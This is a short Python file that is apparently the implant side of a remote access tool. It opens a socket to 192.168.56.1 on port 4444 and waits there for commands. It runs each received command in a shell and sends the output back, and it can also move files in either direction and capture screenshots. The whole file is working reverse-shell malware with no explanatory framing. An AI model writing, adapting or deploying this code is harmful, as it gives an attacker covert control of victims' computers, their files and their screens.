#_*_ coding: utf-8 _*_
import socket
import termcolor
from termcolor import colored
import json
import os
import subprocess
import pyautogui

def data_send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file):
    f = open(file, 'wb')
    soc.settimeout(5)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as x:
            break
    soc.settimeout(None)
    f.close()

def upload_file(file):
    f = open(file, 'rb')
    soc.send(f.read())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')

def shell():
    while True:
        comando = data_recv()
        if comando == 'exit':
            break
        elif comando == 'clear':
            pass
        elif comando [:3] == 'cd ':
            os.chdir(comando[3:])
        elif comando [:6] == 'upload':
            download_file(comando[7:])
        elif comando [:8] == 'download':
            upload_file(comando[9:])
        elif comando [:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif comando == 'help':
            pass
        else:
            exe = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rcomando = exe.stdout.read() + exe.stderr.read()
            rcomando = rcomando.decode(errors='replace')
            data_send(rcomando)

soc =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('192.168.56.1', 4444))
shell()